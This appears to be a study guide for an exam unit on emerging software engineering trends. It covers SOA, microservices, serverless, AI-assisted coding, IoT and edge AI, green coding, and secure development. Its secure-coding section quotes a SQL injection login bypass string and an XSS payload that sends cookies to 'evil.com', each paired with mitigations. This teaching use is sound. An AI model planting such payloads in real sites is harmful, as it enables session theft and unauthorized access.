# Unit VIII: Emerging Trends in Software Engineering

---

## 8.1 Cloud-Native Development

> **Past Questions:**
> - **[Old1]** Write short notes on: SOA Architecture. _(Q7a)_
> - **[Old2]** Write short notes on: Serverless computing. _(Q7a)_
> - **[Old2]** Write short notes on: Micro service architecture. _(Q7b)_
> - **[Internal3]** Write short notes on: Service-Oriented Architecture (SOA). _(Q7a)_

### Service-Oriented Architecture (SOA)

SOA is an architectural style where software is organized as a collection of **loosely coupled, reusable services** that communicate over a network using standard protocols (typically SOAP/XML or REST/JSON).

**Key Characteristics:**
- Each service provides a well-defined **business capability** (e.g., payment service, inventory service, user authentication service).
- Services communicate through a common protocol, often via an **Enterprise Service Bus (ESB)** that acts as a central communication hub.
- Services are **platform-independent** — a Java service can communicate with a .NET service through the ESB.
- Services are **discoverable** — registered in a service registry so other services can find and use them.
- Promotes **reusability** — the same service can be used by multiple applications across the organization.

**SOA vs. Microservices:** SOA preceded microservices and shares the idea of service decomposition, but SOA typically uses a heavyweight ESB, shared databases, and enterprise-level governance. Microservices evolved from SOA with a lighter, more decentralized approach.

### Microservices Architecture

Microservices architecture structures an application as a collection of **small, independently deployable services**, each running its own process and communicating via lightweight mechanisms (usually HTTP REST APIs or messaging queues).

**Principles:**
- **Single Responsibility** — each service does one thing well and owns its own data.
- **Independence** — services are developed, deployed, scaled, and maintained independently by separate teams.
- **Decentralized Governance** — each team can choose its own technology stack (language, database, framework).
- **Fault Isolation** — failure in one service does not bring down the entire application.
- **API-based Communication** — services communicate through well-defined APIs, not shared memory or direct database access.

**Benefits:**
- **Scalability** — scale individual services based on demand (e.g., scale the payment service during sales events without scaling the entire application).
- **Faster deployment** — teams deploy updates to individual services independently without coordinating full system releases.
- **Technology flexibility** — different services can use different languages or databases best suited for their task.
- **Resilience** — circuit breaker patterns and service redundancy prevent cascading failures.

**Challenges:**
- **Complexity** — managing many services introduces operational complexity (service discovery, load balancing, distributed tracing).
- **Network latency** — inter-service communication introduces network overhead.
- **Data consistency** — maintaining consistency across distributed databases is harder than with a single monolithic database.
- **Testing** — integration testing across many services is more difficult.

**Designing Microservices:**
- Decompose by **business capability** (e.g., Order Service, Inventory Service, User Service).
- Each service owns its **own database** (Database per Service pattern) — no shared databases.
- Use **API Gateways** to provide a single entry point for external clients.
- Implement **health checks** and **circuit breakers** for fault tolerance.
- Use **containerization** (Docker) and **orchestration** (Kubernetes) for deployment.

### Serverless Computing

Serverless computing is a cloud execution model where the cloud provider manages the infrastructure entirely — developers write code and the provider handles provisioning, scaling, and server management.

**Core Concepts:**
- **Function-as-a-Service (FaaS)** — developers deploy small, stateless functions that execute in response to events (HTTP requests, database changes, file uploads, scheduled timers). Examples: AWS Lambda, Azure Functions, Google Cloud Functions.
- **Backend-as-a-Service (BaaS)** — pre-built, managed backend services for authentication, databases, storage, etc., eliminating the need for custom backend code.
- **Event-driven** — functions are triggered by events and run only when needed.
- **Stateless** — functions do not retain data between invocations; state is stored externally (databases, object storage).

**Advantages:**
- **No server management** — developers focus entirely on code, not infrastructure.
- **Pay-per-use** — billing based on actual execution time and resources consumed. No cost when code is idle.
- **Automatic scaling** — scales from zero to thousands of concurrent executions instantly based on demand.
- **Faster time to market** — eliminates infrastructure setup, enabling rapid prototyping and deployment.

**Limitations:**
- **Cold starts** — idle functions experience latency on first invocation as the runtime initializes.
- **Vendor lock-in** — heavy dependence on provider-specific APIs and services makes migration difficult.
- **Execution limits** — functions have time limits (e.g., 15 minutes on AWS Lambda), memory caps, and payload size restrictions.
- **Debugging difficulty** — distributed, event-driven architecture is harder to debug and monitor than monolithic applications.
- **Not suited for** long-running computations, stateful applications, or low-latency requirements.

**Use Cases:** API backends, data processing pipelines, IoT event processing, chatbots, image/video processing, scheduled tasks (cron jobs), MVP/prototype development.

---

## 8.2 AI in Software Engineering

> **Past Questions:**
> - **[Old2]** Write short notes on: AI in software engineering. _(Q7c)_

### AI-Assisted Coding and Testing

AI is transforming software engineering by automating repetitive tasks, enhancing code quality, and accelerating the development lifecycle.

**AI-Assisted Coding Tools:**
- **GitHub Copilot** — an AI pair programmer powered by large language models (LLMs). It provides real-time, context-aware code suggestions inside the IDE (VS Code, JetBrains). Generates functions, boilerplate code, and documentation from natural language comments.
- **ChatGPT / Claude** — general-purpose AI assistants used for code generation, debugging, explaining code, and answering technical questions.
- **Amazon CodeWhisperer** — AI code completion tool trained on Amazon's codebase, with security scanning.
- **Tabnine** — AI-powered code completion that learns from the team's codebase.

**How AI Impacts Development:**
- **Code generation** — generates boilerplate, unit tests, and repetitive patterns from natural language prompts.
- **Code completion** — predicts next lines of code based on context, accelerating coding speed by 20–50%.
- **Bug detection** — identifies potential bugs, security vulnerabilities, and code smells in real time before code is committed.
- **Code review assistance** — suggests improvements, identifies anti-patterns, and ensures coding standard compliance.
- **Documentation** — auto-generates docstrings, comments, and API documentation.

**AI in Testing:**
- **Automated test generation** — AI tools generate unit tests and integration tests by analyzing code paths and edge cases.
- **Visual regression testing** — tools like Applitools use AI to detect visual UI changes across browsers and devices.
- **Intelligent debugging** — AI analyzes error patterns, suggests fixes, and correlates failures across similar components.
- **Test prioritization** — ML models predict which tests are most likely to catch bugs based on code changes, running high-risk tests first.

### Machine Learning Applications in Software

- **Predictive analytics** — analyze historical project data to forecast timelines, risks, and resource needs.
- **Defect prediction** — ML models predict which modules are most likely to contain bugs based on code metrics and change history.
- **Automated code review** — ML-based tools learn team coding standards and flag deviations.
- **Natural language processing (NLP)** — extract requirements from natural language documents, automate ticket classification.
- **Recommendation systems** — suggest relevant code snippets, libraries, or API endpoints based on context.

**Challenges of AI in SE:**
- **Accuracy** — AI-generated code may contain bugs, security flaws, or incorrect logic. Human review remains essential.
- **Security risks** — AI tools may suggest insecure patterns or inadvertently expose sensitive data from training data.
- **Skill erosion** — over-reliance on AI may weaken developers' problem-solving and debugging skills.
- **Intellectual property** — AI trained on open-source code raises licensing and copyright concerns.

---

## 8.3 Software for IoT and Edge Computing

> **Past Questions:**
> - **[Old1]** Write short notes on: IoT based Software Engineering. _(Q7b)_
> - **[Internal3]** How would you leverage Edge Computing for a smart city IoT system? Discuss Edge AI for real-time decision-making. _(Q4b)_
> - **[Internal3]** Write short notes on: IoT based Software Engineering. _(Q7d)_

### IoT-Based Software Engineering

The **Internet of Things (IoT)** refers to a network of physical devices (sensors, actuators, cameras, wearables, industrial equipment) connected to the internet, collecting and exchanging data.

**IoT Software Architecture (typical layers):**
- **Device Layer** — sensors and actuators with embedded firmware collecting data.
- **Gateway/Edge Layer** — aggregates data from devices, performs local processing, and relays to the cloud.
- **Cloud Layer** — centralized data storage, analytics, machine learning, and application logic.
- **Application Layer** — user-facing dashboards, mobile apps, and visualization tools.

**Challenges in IoT Software Engineering:**
- **Resource constraints** — IoT devices have limited CPU, memory, storage, and battery. Software must be lightweight and efficient.
- **Heterogeneity** — diverse hardware, operating systems (RTOS, Linux, bare-metal), and communication protocols (MQTT, CoAP, Bluetooth, Zigbee, LoRa).
- **Connectivity** — intermittent, low-bandwidth, or high-latency network connections require offline-capable designs.
- **Security** — large attack surface (thousands of distributed devices), limited resources for encryption, firmware vulnerabilities, physical tampering.
- **Scalability** — systems must handle millions of devices generating continuous data streams.
- **Reliability** — mission-critical IoT systems (smart grids, medical devices) require high availability and fault tolerance.

**Best Practices:**
- Use **lightweight protocols** (MQTT, CoAP) instead of heavy HTTP for device communication.
- Design for **offline operation** — devices should function with local caching and sync when connectivity resumes.
- Implement **over-the-air (OTA) updates** for remote firmware upgrades.
- Apply **security-by-design** — secure boot, encryption, device authentication, and minimal attack surface.
- Use **digital twins** — virtual replicas of physical devices for simulation and testing without hardware.
- Adopt **modular architecture** — decouple device firmware from cloud services for independent updates.

### Edge Computing

**Edge computing** processes data **near the source** (at or close to the IoT devices) rather than sending everything to a centralized cloud data center.

**Why Edge Computing:**
- **Low latency** — real-time applications (autonomous vehicles, industrial automation, smart traffic) cannot tolerate the roundtrip delay to the cloud.
- **Bandwidth savings** — processing data locally reduces the volume of data transmitted over the network.
- **Privacy** — sensitive data (medical, surveillance) can be processed locally without leaving the premises.
- **Reliability** — edge devices continue to operate even when cloud connectivity is lost.

**Edge AI:**
Edge AI runs machine learning models **directly on edge devices** for real-time inference without cloud dependency.

- **Model optimization techniques** for resource-constrained devices:
  - **Quantization** — reduce numerical precision of model weights (e.g., from 32-bit float to 8-bit integer).
  - **Pruning** — remove unnecessary neurons or connections from neural networks.
  - **Knowledge distillation** — train a small "student" model to mimic a large "teacher" model.
- **Frameworks:** TensorFlow Lite, ONNX Runtime, OpenVINO — optimized for running ML on edge hardware.
- **Use cases:** real-time object detection in security cameras, predictive maintenance in factories, voice recognition in smart speakers, autonomous driving decisions.

**Smart City Example:**
In a smart city traffic system, edge computing enables traffic cameras to process video locally (detect congestion, accidents, emergency vehicles) and adjust traffic signals in real time. Only aggregated analytics (traffic patterns, statistics) are sent to the cloud for long-term analysis. Edge AI eliminates the 100–500ms cloud roundtrip that would make real-time traffic control impossible.

---

## 8.4 Sustainability in Software Engineering

> **Past Questions:**
> - **[Internal1]** Write short notes on: Green Computing. _(Q7c)_
> - **[Internal2]** Explain green coding, energy-efficient coding, and eco-friendly coding. How do they contribute to environmental sustainability? _(Q4)_

### Green Computing

Green computing (also called sustainable computing) is the practice of designing, manufacturing, using, and disposing of computing resources in an environmentally responsible and energy-efficient manner.

**Key Goals:** Reduce energy consumption, minimize electronic waste, lower carbon emissions, and promote sustainable resource usage throughout the technology lifecycle.

### Eco-Friendly Practices in Software Engineering

- **Optimize cloud resource usage** — use auto-scaling to match resources to demand; shut down idle instances; choose cloud regions powered by renewable energy.
- **Reduce data center energy** — efficient cooling systems, server virtualization, consolidating workloads onto fewer physical servers.
- **Extend hardware lifespan** — write software that runs efficiently on existing hardware rather than requiring hardware upgrades.
- **Minimize data transfer** — compress data, cache aggressively, reduce API call frequency to lower network energy consumption.
- **Responsible disposal** — recycle old hardware through certified e-waste programs.

### Energy-Efficient Coding

Energy-efficient coding focuses on writing software that **consumes less computational resources** (CPU cycles, memory, disk I/O, network bandwidth), directly reducing energy consumption.

**Techniques:**
- **Algorithm optimization** — choose efficient algorithms with lower time and space complexity. An O(n log n) sort uses significantly less energy than O(n²) on large datasets.
- **Avoid unnecessary computation** — cache results of expensive operations, use lazy loading, avoid polling (use event-driven architecture instead).
- **Efficient data structures** — choose data structures appropriate for the access patterns (e.g., hash maps for lookup-heavy operations).
- **Minimize memory allocation** — reduce garbage collection overhead by reusing objects and avoiding excessive object creation.
- **Optimize database queries** — use indexes, avoid SELECT *, batch operations, and minimize roundtrips to the database.
- **Reduce rendering overhead** — in front-end applications, minimize DOM manipulations, use virtual DOM, lazy-load images.

### Green Coding

Green coding is a broader philosophy that integrates environmental sustainability into the entire software development process.

**Principles:**
- **Measure energy consumption** — use profiling tools to measure the energy footprint of code and identify hotspots.
- **Carbon-aware computing** — schedule batch jobs and non-urgent tasks during times when the electrical grid uses more renewable energy.
- **Serverless and auto-scaling** — pay for only the compute you use; idle resources consume zero energy.
- **Efficient CI/CD** — optimize build pipelines to reduce redundant builds and tests, saving compute resources.
- **Code reviews for efficiency** — include energy efficiency as a review criterion alongside correctness and readability.
- **Dark mode and UI efficiency** — dark themes on OLED screens consume less power. Minimize animations on mobile to save battery.

**Impact on Environmental Sustainability:**
- Data centers consume approximately 1–2% of global electricity. Efficient software directly reduces this.
- A single inefficient database query executed millions of times per day wastes enormous energy.
- Cloud computing powered by renewable energy combined with efficient software can significantly reduce the carbon footprint of the IT industry.

---

## 8.5 Secure Software Development Practices

> **Past Questions:**
> - **[Old1]** Write short notes on: Secure Coding Practices. _(Q7c)_
> - **[Old2]** What are the basic principles of writing secure code? How can common vulnerabilities be identified and mitigated? _(Q3b)_
> - **[Internal3]** Write short notes on: Secure Coding Practices. _(Q7b)_

### Basic Principles of Writing Secure Code

**Input Validation:** Treat all external input as untrusted. Validate type, length, format, and range on the **server side** (client-side validation is easily bypassed). Use allow-lists (define what is permitted) rather than deny-lists (define what is blocked).

**Principle of Least Privilege:** Every user, process, and system component should operate with the **minimum permissions** necessary to perform its function. A web application should never connect to a database with admin privileges.

**Defense in Depth:** Implement **multiple layers** of security controls. If one layer fails, others still protect the system. Combine input validation + parameterized queries + WAF + encrypted connections.

**Fail Securely:** When an error occurs, the system should **default to a secure state**. If authentication fails, deny access (don't grant it). Error messages should not reveal internal system details (stack traces, database names, file paths).

**Secure by Default:** Deploy software with the **most secure configuration** out of the box. Disable unnecessary features, ports, and services. Force strong passwords. Enable encryption by default.

**Keep Security Simple:** Complex security mechanisms are harder to implement correctly and more likely to contain flaws. Prefer simple, well-tested security solutions.

**Separation of Duties:** Divide critical operations across multiple users or components so that no single entity can compromise the system alone.

### Common Vulnerabilities and Mitigation Strategies

**SQL Injection (SQLi):**
- **What:** Attacker injects malicious SQL code through user input fields to manipulate database queries.
- **Example:** Input `' OR 1=1 --` in a login form bypasses authentication by making the query always return true.
- **Mitigation:** Use **parameterized queries / prepared statements** (never concatenate user input into SQL strings). Use stored procedures. Apply least privilege to database accounts. Validate input.

**Cross-Site Scripting (XSS):**
- **What:** Attacker injects malicious JavaScript into web pages viewed by other users, stealing session cookies, redirecting users, or defacing pages.
- **Example:** Injecting `<script>document.location='http://evil.com/steal?c='+document.cookie</script>` into a comment field.
- **Mitigation:** Apply **output encoding** (escape HTML special characters before rendering). Implement **Content Security Policy (CSP)** headers. Use modern frameworks (React, Angular) that auto-escape output. Sanitize user-provided HTML with libraries like DOMPurify.

**Cross-Site Request Forgery (CSRF):**
- **What:** Attacker tricks a logged-in user into unknowingly submitting a malicious request (e.g., transferring funds).
- **Mitigation:** Use **CSRF tokens** (unique, session-specific tokens included in forms and validated on the server). Verify the **Origin/Referer** header. Use SameSite cookie attribute.

**Broken Authentication:**
- **What:** Weak passwords, exposed credentials, missing multi-factor authentication, or improper session management.
- **Mitigation:** Enforce **strong password policies**. Implement **multi-factor authentication (MFA)**. Hash passwords with **bcrypt/Argon2** (never store plaintext). Set session timeouts. Invalidate sessions on logout.

**Sensitive Data Exposure:**
- **What:** Transmitting or storing sensitive data (passwords, credit cards, personal info) without proper encryption.
- **Mitigation:** Use **HTTPS/TLS** for all data in transit. Encrypt sensitive data at rest using **AES-256**. Never log sensitive data. Mask data in non-production environments.

**Security Misconfiguration:**
- **What:** Default passwords, unnecessary open ports, verbose error messages, unpatched software.
- **Mitigation:** Harden configurations. Remove default accounts. Disable directory listing. Keep all software updated and patched.

### Integrating Security Testing into Development

- **Static Application Security Testing (SAST)** — analyze source code for vulnerabilities without executing it. Tools: SonarQube, Fortify, Checkmarx. Run during code review and CI pipeline.
- **Dynamic Application Security Testing (DAST)** — test running applications by simulating attacks. Tools: OWASP ZAP, Burp Suite. Run against staging environments.
- **Software Composition Analysis (SCA)** — scan third-party dependencies for known vulnerabilities. Tools: Snyk, Dependabot.
- **Penetration Testing** — ethical hackers attempt to exploit the system to discover vulnerabilities before attackers do.
- **DevSecOps** — integrate security testing into every stage of the CI/CD pipeline. Security is not a final phase — it is continuous.

---
